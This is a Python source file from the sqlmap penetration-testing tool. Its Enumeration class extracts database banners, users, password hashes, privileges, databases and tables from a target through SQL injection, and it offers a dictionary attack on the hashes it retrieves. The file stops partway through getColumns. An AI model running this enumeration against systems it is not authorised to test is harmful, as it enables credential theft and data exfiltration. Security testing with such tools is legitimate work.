#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2012 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.common import arrayizeValue
from lib.core.common import Backend
from lib.core.common import BigArray
from lib.core.common import clearConsoleLine
from lib.core.common import dataToStdout
from lib.core.common import filterPairValues
from lib.core.common import getRange
from lib.core.common import getCompiledRegex
from lib.core.common import getUnicode
from lib.core.common import isInferenceAvailable
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import parsePasswordHash
from lib.core.common import parseSqliteTableSchema
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import safeStringFormat
from lib.core.common import safeSQLIdentificatorNaming
from lib.core.common import singleTimeWarnMessage
from lib.core.common import strToHex
from lib.core.common import unArrayizeValue
from lib.core.common import unsafeSQLIdentificatorNaming
from lib.core.convert import safechardecode
from lib.core.convert import utf8decode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.data import queries
from lib.core.dicts import firebirdTypes
from lib.core.dicts import mysqlPrivs
from lib.core.dicts import pgsqlPrivs
from lib.core.dicts import firebirdPrivs
from lib.core.dicts import db2Privs
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import sqlmapConnectionException
from lib.core.exception import sqlmapMissingMandatoryOptionException
from lib.core.exception import sqlmapNoneDataException
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.exception import sqlmapUserQuitException
from lib.core.session import setOs
from lib.core.settings import CONCAT_ROW_DELIMITER
from lib.core.settings import CONCAT_VALUE_DELIMITER
from lib.core.settings import DEFAULT_MSSQL_SCHEMA
from lib.core.settings import MAX_INT
from lib.core.settings import SQL_STATEMENTS
from lib.core.shell import autoCompletion
from lib.core.unescaper import unescaper
from lib.core.threads import getCurrentThreadData
from lib.parse.banner import bannerParser
from lib.request import inject
from lib.request.connect import Connect as Request
from lib.techniques.brute.use import columnExists
from lib.techniques.brute.use import tableExists
from lib.utils.hash import attackDumpedTable
from lib.utils.hash import attackCachedUsersPasswords

class Enumeration:
    """
    This class defines generic enumeration functionalities for plugins.
    """

    def __init__(self):
        kb.data.has_information_schema = False
        kb.data.banner = None
        kb.data.currentUser = ""
        kb.data.currentDb = ""
        kb.data.cachedUsers = []
        kb.data.cachedUsersPasswords = {}
        kb.data.cachedUsersPrivileges = {}
        kb.data.cachedUsersRoles = {}
        kb.data.cachedDbs = []
        kb.data.cachedTables = {}
        kb.data.cachedColumns = {}
        kb.data.cachedCounts = {}
        kb.data.dumpedTable = {}
        kb.data.processChar = None

    def getBanner(self):
        if not conf.getBanner:
            return

        if kb.data.banner is None:
            infoMsg = "fetching banner"
            logger.info(infoMsg)

            # Needed for IBM DB2 versions < 9
            if Backend.isDbms(DBMS.DB2) and int(Backend.getVersion().split(".")[0]) < 9:
                query = queries[Backend.getIdentifiedDbms()].banner.query2
                kb.data.banner = unArrayizeValue(inject.getValue(query, safeCharEncode=False))
            else:
                query = queries[Backend.getIdentifiedDbms()].banner.query
                kb.data.banner = unArrayizeValue(inject.getValue(query, safeCharEncode=False))

            bannerParser(kb.data.banner)

            if conf.os and conf.os == "windows":
                kb.bannerFp["type"] = set([ "Windows" ])

            elif conf.os and conf.os == "linux":
                kb.bannerFp["type"] = set([ "Linux" ])

            elif conf.os:
                kb.bannerFp["type"] = set([ "%s%s" % (conf.os[0].upper(), conf.os[1:]) ])

            if conf.os:
                setOs()

        return kb.data.banner

    def getCurrentUser(self):
        infoMsg = "fetching current user"
        logger.info(infoMsg)

        query = queries[Backend.getIdentifiedDbms()].current_user.query

        if not kb.data.currentUser:
            kb.data.currentUser = unArrayizeValue(inject.getValue(query))

        return kb.data.currentUser

    def getCurrentDb(self):
        infoMsg = "fetching current database"
        logger.info(infoMsg)

        query = queries[Backend.getIdentifiedDbms()].current_db.query

        if not kb.data.currentDb:
            kb.data.currentDb = unArrayizeValue(inject.getValue(query, safeCharEncode=False))

        return kb.data.currentDb

    def isDba(self, user=None):
        infoMsg = "testing if current user is DBA"
        logger.info(infoMsg)

        if Backend.isDbms(DBMS.MYSQL):
            self.getCurrentUser()
            query = queries[Backend.getIdentifiedDbms()].is_dba.query % (kb.data.currentUser.split("@")[0] if kb.data.currentUser else None)
        elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and user is not None:
            query = queries[Backend.getIdentifiedDbms()].is_dba.query2 % user
        else:
            query = queries[Backend.getIdentifiedDbms()].is_dba.query

        query = agent.forgeCaseStatement(query)
        isDba = inject.getValue(query, charsetType=1)

        if user is None:
            kb.data.isDba = unArrayizeValue(isDba)

        return isDba == "1"

    def getUsers(self):
        infoMsg = "fetching database users"
        logger.info(infoMsg)

        rootQuery = queries[Backend.getIdentifiedDbms()].users

        condition = ( Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")) )
        condition |= ( Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema )

        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)) or conf.direct:
            if condition:
                query = rootQuery.inband.query2
            else:
                query = rootQuery.inband.query
            value = inject.getValue(query, blind=False)

            if not isNoneValue(value):
                kb.data.cachedUsers = arrayizeValue(value)

        if not kb.data.cachedUsers and isInferenceAvailable() and not conf.direct:
            infoMsg = "fetching number of database users"
            logger.info(infoMsg)

            if condition:
                query = rootQuery.blind.count2
            else:
                query = rootQuery.blind.count
            count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

            if not isNumPosStrValue(count):
                errMsg = "unable to retrieve the number of database users"
                raise sqlmapNoneDataException, errMsg

            if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                plusOne = True
            else:
                plusOne = False
            indexRange = getRange(count, plusOne=plusOne)

            for index in indexRange:
                if Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MAXDB):
                    query = rootQuery.blind.query % (kb.data.cachedUsers[-1] if kb.data.cachedUsers else " ")
                elif condition:
                    query = rootQuery.blind.query2 % index
                else:
                    query = rootQuery.blind.query % index
                user = inject.getValue(query, inband=False, error=False)

                if user:
                    kb.data.cachedUsers.append(user)

        if not kb.data.cachedUsers:
            errMsg = "unable to retrieve the database users"
            raise sqlmapNoneDataException, errMsg

        return kb.data.cachedUsers

    def getPasswordHashes(self):
        infoMsg = "fetching database users password hashes"

        rootQuery = queries[Backend.getIdentifiedDbms()].passwords

        if conf.user == "CU":
            infoMsg += " for current user"
            conf.user = self.getCurrentUser()

        logger.info(infoMsg)

        if conf.user and Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
            conf.user = conf.user.upper()

        if conf.user:
            users = conf.user.split(",")

            if Backend.isDbms(DBMS.MYSQL):
                for user in users:
                    parsedUser = re.search("[\047]*(.*?)[\047]*\@", user)

                    if parsedUser:
                        users[users.index(user)] = parsedUser.groups()[0]
        else:
            users = []

        users = filter(None, users)

        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)) or conf.direct:
            if Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                query = rootQuery.inband.query2
            else:
                query = rootQuery.inband.query

            condition = rootQuery.inband.condition

            if conf.user:
                query += " WHERE "
                query += " OR ".join("%s = '%s'" % (condition, user) for user in sorted(users))

            if Backend.isDbms(DBMS.SYBASE):
                randStr = randomStr()
                getCurrentThreadData().disableStdOut = True

                retVal = self.__pivotDumpTable("(%s) AS %s" % (query, randStr), ['%s.name' % randStr,'%s.password' % randStr], blind=False)

                if retVal:
                    for user, password in filterPairValues(zip(retVal[0]["%s.name" % randStr], retVal[0]["%s.password" % randStr])):
                        # password = "0x%s" % strToHex(password)
                        if not kb.data.cachedUsersPasswords.has_key(user):
                            kb.data.cachedUsersPasswords[user] = [password]
                        else:
                            kb.data.cachedUsersPasswords[user].append(password)

                getCurrentThreadData().disableStdOut = False
            else:
                value = inject.getValue(query, blind=False)

                for user, password in filterPairValues(value):
                    if not user or user == " ":
                        continue

                    password = parsePasswordHash(password)

                    if not kb.data.cachedUsersPasswords.has_key(user):
                        kb.data.cachedUsersPasswords[user] = [password]
                    else:
                        kb.data.cachedUsersPasswords[user].append(password)

        if not kb.data.cachedUsersPasswords and isInferenceAvailable() and not conf.direct:
            if not len(users):
                users = self.getUsers()

                if Backend.isDbms(DBMS.MYSQL):
                    for user in users:
                        parsedUser = re.search("[\047]*(.*?)[\047]*\@", user)

                        if parsedUser:
                            users[users.index(user)] = parsedUser.groups()[0]

            if Backend.isDbms(DBMS.SYBASE):
                getCurrentThreadData().disableStdOut = True

                randStr = randomStr()
                query = rootQuery.inband.query

                retVal = self.__pivotDumpTable("(%s) AS %s" % (query, randStr), ['%s.name' % randStr,'%s.password' % randStr], blind=True)

                if retVal:
                    for user, password in filterPairValues(zip(retVal[0]["%s.name" % randStr], retVal[0]["%s.password" % randStr])):
                        password = "0x%s" % strToHex(password)

                        if not kb.data.cachedUsersPasswords.has_key(user):
                            kb.data.cachedUsersPasswords[user] = [password]
                        else:
                            kb.data.cachedUsersPasswords[user].append(password)

                getCurrentThreadData().disableStdOut = False
            else:
                retrievedUsers = set()

                for user in users:
                    if user in retrievedUsers:
                        continue

                    infoMsg = "fetching number of password hashes "
                    infoMsg += "for user '%s'" % user
                    logger.info(infoMsg)

                    if Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                        query = rootQuery.blind.count2 % user
                    else:
                        query = rootQuery.blind.count % user
                    count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

                    if not isNumPosStrValue(count):
                        warnMsg = "unable to retrieve the number of password "
                        warnMsg += "hashes for user '%s'" % user
                        logger.warn(warnMsg)
                        continue

                    infoMsg = "fetching password hashes for user '%s'" % user
                    logger.info(infoMsg)

                    passwords = []

                    if Backend.isDbms(DBMS.ORACLE):
                        plusOne = True
                    else:
                        plusOne = False
                    indexRange = getRange(count, plusOne=plusOne)

                    for index in indexRange:
                        if Backend.isDbms(DBMS.MSSQL):
                            if Backend.isVersionWithin(("2005", "2008")):
                                query = rootQuery.blind.query2 % (user, index, user)
                            else:
                                query = rootQuery.blind.query % (user, index, user)
                        else:
                            query = rootQuery.blind.query % (user, index)
                        password = inject.getValue(query, inband=False, error=False)
                        password = parsePasswordHash(password)
                        passwords.append(password)

                    if passwords:
                        kb.data.cachedUsersPasswords[user] = passwords
                    else:
                        warnMsg = "unable to retrieve the password "
                        warnMsg += "hashes for user '%s'" % user
                        logger.warn(warnMsg)

                    retrievedUsers.add(user)

        if not kb.data.cachedUsersPasswords:
            errMsg = "unable to retrieve the password hashes for the "
            errMsg += "database users (most probably because the session "
            errMsg += "user has no read privileges over the relevant "
            errMsg += "system database table)"
            raise sqlmapNoneDataException, errMsg

        message = "do you want to perform a dictionary-based attack "
        message += "against retrieved password hashes? [Y/n/q]"
        test = readInput(message, default="Y")

        if test[0] in ("n", "N"):
            pass
        elif test[0] in ("q", "Q"):
            raise sqlmapUserQuitException
        else:
            attackCachedUsersPasswords()

        return kb.data.cachedUsersPasswords

    def __isAdminFromPrivileges(self, privileges):
        # In PostgreSQL the usesuper privilege means that the
        # user is DBA
        dbaCondition = ( Backend.isDbms(DBMS.PGSQL) and "super" in privileges )

        # In Oracle the DBA privilege means that the
        # user is DBA
        dbaCondition |= ( Backend.isDbms(DBMS.ORACLE) and "DBA" in privileges )

        # In MySQL >= 5.0 the SUPER privilege means
        # that the user is DBA
        dbaCondition |= ( Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema and "SUPER" in privileges )

        # In MySQL < 5.0 the super_priv privilege means
        # that the user is DBA
        dbaCondition |= ( Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema and "super_priv" in privileges )

        # In Firebird there is no specific privilege that means
        # that the user is DBA
        # TODO: confirm
        dbaCondition |= ( Backend.isDbms(DBMS.FIREBIRD) and "SELECT" in privileges and "INSERT" in privileges and "UPDATE" in privileges and "DELETE" in privileges and "REFERENCES" in privileges and "EXECUTE" in privileges )

        return dbaCondition

    def getPrivileges(self, query2=False):
        infoMsg = "fetching database users privileges"

        rootQuery = queries[Backend.getIdentifiedDbms()].privileges

        if conf.user == "CU":
            infoMsg += " for current user"
            conf.user = self.getCurrentUser()

        logger.info(infoMsg)

        if conf.user and Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
            conf.user = conf.user.upper()

        if conf.user:
            users = conf.user.split(",")

            if Backend.isDbms(DBMS.MYSQL):
                for user in users:
                    parsedUser = re.search("[\047]*(.*?)[\047]*\@", user)

                    if parsedUser:
                        users[users.index(user)] = parsedUser.groups()[0]
        else:
            users = []

        users = filter(None, users)

        # Set containing the list of DBMS administrators
        areAdmins = set()

        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)) or conf.direct:
            if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                query = rootQuery.inband.query2
                condition = rootQuery.inband.condition2
            elif Backend.isDbms(DBMS.ORACLE) and query2:
                query = rootQuery.inband.query2
                condition = rootQuery.inband.condition2
            else:
                query = rootQuery.inband.query
                condition = rootQuery.inband.condition

            if conf.user:
                query += " WHERE "

                if Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:
                    query += " OR ".join("%s LIKE '%%%s%%'" % (condition, user) for user in sorted(users))
                else:
                    query += " OR ".join("%s = '%s'" % (condition, user) for user in sorted(users))

            values = inject.getValue(query, blind=False)

            if not values and Backend.isDbms(DBMS.ORACLE) and not query2:
                infoMsg = "trying with table USER_SYS_PRIVS"
                logger.info(infoMsg)

                return self.getPrivileges(query2=True)

            if not isNoneValue(values):
                for value in values:
                    user = None
                    privileges = set()

                    for count in xrange(0, len(value)):
                        # The first column is always the username
                        if count == 0:
                            user = value[count]

                        # The other columns are the privileges
                        else:
                            privilege = value[count]

                            # In PostgreSQL we get 1 if the privilege is
                            # True, 0 otherwise
                            if Backend.isDbms(DBMS.PGSQL) and getUnicode(privilege).isdigit():
                                if int(privilege) == 1:
                                    privileges.add(pgsqlPrivs[count])

                            # In MySQL >= 5.0 and Oracle we get the list
                            # of privileges as string
                            elif Backend.isDbms(DBMS.ORACLE) or ( Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema ):
                                privileges.add(privilege)

                            # In MySQL < 5.0 we get Y if the privilege is 
                            # True, N otherwise
                            elif Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                                if privilege.upper() == "Y":
                                    privileges.add(mysqlPrivs[count])

                            # In DB2 we get Y or G if the privilege is
                            # True, N otherwise
                            elif Backend.isDbms(DBMS.DB2):
                                privs = privilege.split(",")
                                privilege = privs[0]
                                privs = privs[1]
                                privs = list(privs.strip())
                                i = 1

                                for priv in privs:
                                    if priv.upper() in ("Y", "G"):
                                        for position, db2Priv in db2Privs.items():
                                            if position == i:
                                                privilege += ", " + db2Priv

                                    i += 1

                                privileges.add(privilege)  

                    if self.__isAdminFromPrivileges(privileges):
                        areAdmins.add(user)

                    if kb.data.cachedUsersPrivileges.has_key(user):
                        kb.data.cachedUsersPrivileges[user].extend(privileges)
                    else:
                        kb.data.cachedUsersPrivileges[user] = list(privileges)

        if not kb.data.cachedUsersPrivileges and isInferenceAvailable() and not conf.direct:
            if Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:
                conditionChar = " LIKE "
            else:
                conditionChar = "="

            if not len(users):
                users = self.getUsers()

                if Backend.isDbms(DBMS.MYSQL):
                    for user in users:
                        parsedUser = re.search("[\047]*(.*?)[\047]*\@", user)

                        if parsedUser:
                            users[users.index(user)] = parsedUser.groups()[0]

            retrievedUsers = set()

            for user in users:
                if user in retrievedUsers:
                    continue

                if Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:
                    user = "%%%s%%" % user

                infoMsg = "fetching number of privileges "
                infoMsg += "for user '%s'" % user
                logger.info(infoMsg)

                if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                    query = rootQuery.blind.count2 % user
                elif Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:
                    query = rootQuery.blind.count % (conditionChar, user)
                elif Backend.isDbms(DBMS.ORACLE) and query2:
                    query = rootQuery.blind.count2 % user
                else:
                    query = rootQuery.blind.count % user
                count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

                if not isNumPosStrValue(count):
                    if not (isinstance(count, basestring) and count.isdigit()) and Backend.isDbms(DBMS.ORACLE) and not query2:
                        infoMsg = "trying with table USER_SYS_PRIVS"
                        logger.info(infoMsg)

                        return self.getPrivileges(query2=True)

                    warnMsg = "unable to retrieve the number of "
                    warnMsg += "privileges for user '%s'" % user
                    logger.warn(warnMsg)
                    continue

                infoMsg = "fetching privileges for user '%s'" % user
                logger.info(infoMsg)

                privileges = set()

                if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                    plusOne = True
                else:
                    plusOne = False
                indexRange = getRange(count, plusOne=plusOne)

                for index in indexRange:
                    if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                        query = rootQuery.blind.query2 % (user, index)
                    elif Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:
                        query = rootQuery.blind.query % (conditionChar, user, index)
                    elif Backend.isDbms(DBMS.ORACLE) and query2:
                        query = rootQuery.blind.query2 % (user, index)
                    elif Backend.isDbms(DBMS.FIREBIRD):
                        query = rootQuery.blind.query % (index, user)
                    else:
                        query = rootQuery.blind.query % (user, index)
                    privilege = inject.getValue(query, inband=False, error=False)

                    # In PostgreSQL we get 1 if the privilege is True,
                    # 0 otherwise
                    if Backend.isDbms(DBMS.PGSQL) and ", " in privilege:
                        privilege = privilege.replace(", ", ",")
                        privs = privilege.split(",")
                        i = 1

                        for priv in privs:
                            if priv.isdigit() and int(priv) == 1:
                                for position, pgsqlPriv in pgsqlPrivs.items():
                                    if position == i:
                                        privileges.add(pgsqlPriv)

                            i += 1

                    # In MySQL >= 5.0 and Oracle we get the list
                    # of privileges as string
                    elif Backend.isDbms(DBMS.ORACLE) or ( Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema ):
                        privileges.add(privilege)

                    # In MySQL < 5.0 we get Y if the privilege is 
                    # True, N otherwise
                    elif Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                        privilege = privilege.replace(", ", ",")
                        privs = privilege.split(",")
                        i = 1

                        for priv in privs:
                            if priv.upper() == "Y":
                                for position, mysqlPriv in mysqlPrivs.items():
                                    if position == i:
                                        privileges.add(mysqlPriv)

                            i += 1

                    # In Firebird we get one letter for each privilege
                    elif Backend.isDbms(DBMS.FIREBIRD):
                        privileges.add(firebirdPrivs[privilege.strip()])

                    # In DB2 we get Y or G if the privilege is
                    # True, N otherwise
                    elif Backend.isDbms(DBMS.DB2):
                        privs = privilege.split(",")
                        privilege = privs[0]
                        privs = privs[1]
                        privs = list(privs.strip())
                        i = 1

                        for priv in privs:
                            if priv.upper() in ("Y", "G"):
                                for position, db2Priv in db2Privs.items():
                                    if position == i:
                                        privilege += ", " + db2Priv

                            i += 1

                        privileges.add(privilege)

                    if self.__isAdminFromPrivileges(privileges):
                        areAdmins.add(user)

                    # In MySQL < 5.0 we break the cycle after the first
                    # time we get the user's privileges otherwise we
                    # duplicate the same query
                    if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                        break

                if privileges:
                    kb.data.cachedUsersPrivileges[user] = list(privileges)
                else:
                    warnMsg = "unable to retrieve the privileges "
                    warnMsg += "for user '%s'" % user
                    logger.warn(warnMsg)

                retrievedUsers.add(user)

        if not kb.data.cachedUsersPrivileges:
            errMsg = "unable to retrieve the privileges "
            errMsg += "for the database users"
            raise sqlmapNoneDataException, errMsg

        return ( kb.data.cachedUsersPrivileges, areAdmins )

    def getRoles(self, query2=False):
        warnMsg = "on %s the concept of roles does not " % Backend.getIdentifiedDbms()
        warnMsg += "exist. sqlmap will enumerate privileges instead"
        logger.warn(warnMsg)

        return self.getPrivileges(query2)

    def getDbs(self):
        if len(kb.data.cachedDbs) > 0:
            return kb.data.cachedDbs

        infoMsg = None

        if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
            warnMsg = "information_schema not available, "
            warnMsg += "back-end DBMS is MySQL < 5. database "
            warnMsg += "names will be fetched from 'mysql' database"
            logger.warn(warnMsg)

        elif Backend.isDbms(DBMS.ORACLE):
            warnMsg = "schema names are going to be used on Oracle "
            warnMsg += "for enumeration as the counterpart to database "
            warnMsg += "names on other DBMSes"
            logger.warn(warnMsg)

            infoMsg = "fetching database (schema) names"
        elif Backend.isDbms(DBMS.DB2):
            warnMsg = "schema names are going to be used on IBM DB2 "
            warnMsg += "for enumeration as the counterpart to database "
            warnMsg += "names on other DBMSes"
            logger.warn(warnMsg)

            infoMsg = "fetching database (schema) names"
        else:
            infoMsg = "fetching database names"

        if infoMsg:
            logger.info(infoMsg)

        rootQuery = queries[Backend.getIdentifiedDbms()].dbs

        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)) or conf.direct:
            if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                query = rootQuery.inband.query2
            else:
                query = rootQuery.inband.query
            value = inject.getValue(query, blind=False)

            if not isNoneValue(value):
                kb.data.cachedDbs = arrayizeValue(value)

        if not kb.data.cachedDbs and isInferenceAvailable() and not conf.direct:
            infoMsg = "fetching number of databases"
            logger.info(infoMsg)

            if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                query = rootQuery.blind.count2
            else:
                query = rootQuery.blind.count
            count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

            if not isNumPosStrValue(count):
                errMsg = "unable to retrieve the number of databases"
                logger.error(errMsg)
            else:
                if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                    plusOne = True
                else:
                    plusOne = False
                indexRange = getRange(count, plusOne=plusOne)

                for index in indexRange:
                    if Backend.isDbms(DBMS.SYBASE):
                        query = rootQuery.blind.query % (kb.data.cachedDbs[-1] if kb.data.cachedDbs else " ")
                    elif Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                        query = rootQuery.blind.query2 % index
                    else:
                        query = rootQuery.blind.query % index
                    db = inject.getValue(query, inband=False, error=False)

                    if db:
                        kb.data.cachedDbs.append(safeSQLIdentificatorNaming(db))

        if not kb.data.cachedDbs:
            infoMsg = "falling back to current database"
            logger.info(infoMsg)
            self.getCurrentDb()

            if kb.data.currentDb:
                kb.data.cachedDbs = [kb.data.currentDb]
            else:
                errMsg = "unable to retrieve the database names"
                raise sqlmapNoneDataException, errMsg
        else:
            kb.data.cachedDbs.sort()

        return kb.data.cachedDbs

    def getTables(self, bruteForce=None):
        if len(kb.data.cachedTables) > 0:
            return kb.data.cachedTables

        self.forceDbmsEnum()

        if bruteForce is None:
            if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                errMsg = "information_schema not available, "
                errMsg += "back-end DBMS is MySQL < 5.0"
                logger.error(errMsg)
                bruteForce = True

            elif Backend.isDbms(DBMS.ACCESS):
                try:
                    tables = self.getTables(False)
                except sqlmapNoneDataException:
                    tables = None

                if not tables:
                    errMsg = "cannot retrieve table names, "
                    errMsg += "back-end DBMS is Access"
                    logger.error(errMsg)
                    bruteForce = True
                else:
                    return tables

        if conf.db == "CD":
            conf.db = self.getCurrentDb()

        if conf.db and Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
            conf.db = conf.db.upper()

        if conf.db:
            dbs = conf.db.split(",")
        else:
            dbs = self.getDbs()

        for db in dbs:
            dbs[dbs.index(db)] = safeSQLIdentificatorNaming(db)

        dbs = filter(None, dbs)

        if bruteForce:
            resumeAvailable = False

            for db, table in kb.brute.tables:
                if db == conf.db:
                    resumeAvailable = True
                    break

            if resumeAvailable:
                for db, table in kb.brute.tables:
                    if db == conf.db:
                        if not kb.data.cachedTables.has_key(conf.db):
                            kb.data.cachedTables[conf.db] = [table]
                        else:
                            kb.data.cachedTables[conf.db].append(table)

                return kb.data.cachedTables

            message = "do you want to use common table existence check? [Y/n/q]"
            test = readInput(message, default="Y")

            if test[0] in ("n", "N"):
                return
            elif test[0] in ("q", "Q"):
                raise sqlmapUserQuitException
            else:
                return tableExists(paths.COMMON_TABLES)

        infoMsg = "fetching tables for database"
        infoMsg += "%s: %s" % ("s" if len(dbs) > 1 else "", ", ".join(db for db in sorted(dbs)))
        logger.info(infoMsg)

        rootQuery = queries[Backend.getIdentifiedDbms()].tables

        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)) or conf.direct:
            query = rootQuery.inband.query
            condition = rootQuery.inband.condition if 'condition' in rootQuery.inband else None

            if condition:
                if conf.excludeSysDbs:
                    query += " WHERE "
                    query += " AND ".join("%s != '%s'" % (condition, unsafeSQLIdentificatorNaming(db)) for db in self.excludeDbsList)
                    infoMsg = "skipping system database%s '%s'" % ("s" if len(self.excludeDbsList) > 1 else "", ", ".join(db for db in self.excludeDbsList))
                    logger.info(infoMsg)
                elif not Backend.isDbms(DBMS.SQLITE):
                    query += " WHERE "
                    query += " OR ".join("%s = '%s'" % (condition, unsafeSQLIdentificatorNaming(db)) for db in sorted(dbs))

                if len(dbs) < 2 and ("%s," % condition) in query:
                    query = query.replace("%s," % condition, "", 1)

            value = inject.getValue(query, blind=False)

            if not isNoneValue(value):
                value = filter(None, arrayizeValue(value))

                if len(value) > 0 and not isinstance(value[0], (list, tuple)):
                    value = map(lambda x: (dbs[0], x), value)

                for db, table in filterPairValues(value):
                    db = safeSQLIdentificatorNaming(db)
                    table = safeSQLIdentificatorNaming(table, True)

                    if not kb.data.cachedTables.has_key(db):
                        kb.data.cachedTables[db] = [table]
                    else:
                        kb.data.cachedTables[db].append(table)

        if not kb.data.cachedTables and isInferenceAvailable() and not conf.direct:
            for db in dbs:
                if conf.excludeSysDbs and db in self.excludeDbsList:
                    infoMsg = "skipping system database '%s'" % db
                    logger.info(infoMsg)

                    continue

                infoMsg = "fetching number of tables for "
                infoMsg += "database '%s'" % db
                logger.info(infoMsg)

                if Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.ACCESS):
                    query = rootQuery.blind.count
                else:
                    query = rootQuery.blind.count % unsafeSQLIdentificatorNaming(db)
                count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

                if not isNumPosStrValue(count):
                    warnMsg = "unable to retrieve the number of "
                    warnMsg += "tables for database '%s'" % db
                    logger.warn(warnMsg)
                    continue

                tables = []

                if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                    plusOne = True
                else:
                    plusOne = False
                indexRange = getRange(count, plusOne=plusOne)

                for index in indexRange:
                    if Backend.isDbms(DBMS.SYBASE):
                        query = rootQuery.blind.query % (db, (kb.data.cachedTables[-1] if kb.data.cachedTables else " "))
                    elif Backend.getIdentifiedDbms() in (DBMS.MAXDB, DBMS.ACCESS):
                        query = rootQuery.blind.query % (kb.data.cachedTables[-1] if kb.data.cachedTables else " ")
                    elif Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.FIREBIRD):
                        query = rootQuery.blind.query % index
                    else:
                        query = rootQuery.blind.query % (unsafeSQLIdentificatorNaming(db), index)

                    table = inject.getValue(query, inband=False, error=False)
                    kb.hintValue = table
                    table = safeSQLIdentificatorNaming(table, True)
                    tables.append(table)

                if tables:
                    kb.data.cachedTables[db] = tables
                else:
                    warnMsg = "unable to retrieve the table names "
                    warnMsg += "for database '%s'" % db
                    logger.warn(warnMsg)

        if isNoneValue(kb.data.cachedTables):
            kb.data.cachedTables.clear()

        if not kb.data.cachedTables:
            errMsg = "unable to retrieve the table names for any database"
            if bruteForce is None:
                logger.error(errMsg)
                return self.getTables(bruteForce=True)
            else:
                raise sqlmapNoneDataException, errMsg
        else:
            for db, tables in kb.data.cachedTables.items():
                kb.data.cachedTables[db] = sorted(tables) if tables else tables

        return kb.data.cachedTables

    def getColumns(self, onlyColNames=False, colTuple=None, bruteForce=None):
        self.forceDbmsEnum()

        if conf.db is None or conf.db == "CD":
            if conf.db is None:
                warnMsg = "missing database parameter, sqlmap is going "
                warnMsg += "to use the current database to enumerate "
                warnMsg += "table(s) columns"
                logger.warn(warnMsg)

            conf.db = self.getCurrentDb()

        elif conf.db is not None:
            if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                conf.db = conf.db.upper()

            if  ',' in conf.db:
                errMsg = "only one database name is allowed when enumerating "
                errMsg += "the tables' columns"
                raise sqlmapMissingMandatoryOptionException, errMsg

        conf.db = safeSQLIdentificatorNaming(conf.db)

        if conf.col:
            if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                conf.col = conf.col.upper()

            colList = conf.col.split(",")
        else:
            colList = []

        for col in colList:
            colList[colList.index(col)] = safeSQLIdentificatorNaming(col)

        colList = filter(None, colList)

        if conf.tbl:
            if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                conf.tbl = conf.tbl.upper()

            tblList = conf.tbl.split(",")
        else:
            self.getTables()

